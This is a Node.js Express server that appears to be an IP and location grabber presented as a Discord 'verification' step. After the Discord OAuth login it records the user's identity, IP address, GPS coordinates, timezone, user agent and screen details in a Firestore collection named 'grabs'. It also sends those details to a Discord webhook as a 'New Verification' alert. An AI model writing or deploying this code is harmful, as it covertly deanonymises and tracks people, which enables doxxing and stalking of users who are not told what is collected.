const express = require('express');
const axios = require('axios');
const cors = require('cors');
const admin = require('firebase-admin');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

admin.initializeApp({
  credential: admin.credential.cert(require('./firebase.json'))
});
const db = admin.firestore();

app.post('/callback', async (req, res) => {
  const {
    code,
    platform,
    screenResolution,
    userAgent,
    language,
    timezone,
    latitude,
    longitude
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date();
  const unixSeconds = Math.floor(timestamp.getTime() / 1000);
  const nanoseconds = (timestamp.getTime() % 1000) * 1e6;

  if (!code) return res.status(400).send('Missing Discord code');

  let discordUserId = 'unknown';
  let discordUsername = 'unknown';

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: process.env.REDIRECT_URI,
        scope: 'identify'
      }), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

    const accessToken = tokenResponse.data.access_token;

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    discordUserId = userResponse.data.id;
    discordUsername = `${userResponse.data.username}#${userResponse.data.discriminator}`;
  } catch (e) {
    console.error('OAuth Error:', e.response?.data || e.message);
  }

  const entry = {
    ip,
    code,
    discordUserId,
    discordUsername,
    latitude,
    longitude,
    timezone,
    platform,
    screenResolution,
    userAgent,
    language,
    timestamp: timestamp.toISOString(),
    ts: {
      seconds: unixSeconds,
      nanoseconds: nanoseconds
    }
  };

  // Store in Firebase
  try {
    const ref = await db.collection('grabs').add(entry);
    entry.id = ref.id;
  } catch (e) {
    console.error('Firebase error:', e);
  }

  // Send to Discord Webhook
  try {
    await axios.post(process.env.WEBHOOK_URL, {
      content: `**New Verification**\nUser: ${discordUsername} (${discordUserId})\nIP: ${ip}\nPlatform: ${platform}\nScreen: ${screenResolution}\nLocation: ${latitude}, ${longitude}\nLang: ${language}\nTZ: ${timezone}\nUA: ${userAgent}`
    });
  } catch (e) {
    console.error('Webhook Error:', e.response?.data || e.message);
  }

  res.status(200).json({ success: true });
});
